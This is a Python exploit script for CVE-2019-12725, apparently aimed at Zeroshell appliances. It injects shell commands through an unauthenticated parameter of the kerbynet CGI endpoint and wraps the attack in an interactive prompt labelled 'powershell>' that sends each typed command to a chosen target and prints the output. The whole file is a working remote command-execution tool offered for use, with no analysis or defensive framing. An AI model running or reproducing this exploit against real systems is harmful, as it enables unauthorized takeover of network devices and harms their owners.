import requests
from urllib.parse import quote
import re
if __name__ == '__main__':
	show = r'''

     _______    ________    ___   ____ _______       ______  ________   ______
    / ____/ |  / / ____/   |__ \ / __ <  / __ \     <  /__ \/__  /__ \ / ____/
   / /    | | / / __/________/ // / / / / /_/ /_____/ /__/ /  / /__/ //___ \
  / /___  | |/ / /__/_____/ __// /_/ / /\__, /_____/ // __/  / // __/____/ /
  \____/  |___/_____/    /____/\____/_//____/     /_//____/ /_//____/_____/
                                                                                                    
                              		                     CVE-2019-12725 By XU17
Usage Example:                                                            
    Target ip> http://192.168.1.1/
    ——————————————————————————————————————————————————————————————————————————————————
    powershell> whoami
    '''
	print(show + '\n')
base_url = input("Target ip> ")
print('——————————————————————————————————————————————————————————————————————————————————')
while True:
    cmd = input("powershell> ") 

    if cmd.lower() == 'exit':
        break

    payload = "/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type='%0A{cmd}%0A'"
    encoded_cmd = quote(cmd)
 
    url = f"{base_url}{payload.replace('{cmd}', encoded_cmd)}"  
    try:
        response = requests.get(url)

        clean_text = re.sub(r'<html>.*?</html>', '', response.text, flags=re.DOTALL)
        clean_text = re.sub(r'\n\s*\n', '\n', clean_text, flags=re.MULTILINE)
        half_text = clean_text[:int((len(clean_text)/2))]
        print(half_text)

    except requests.RequestException as e:
        print(f"Request Error:{e}")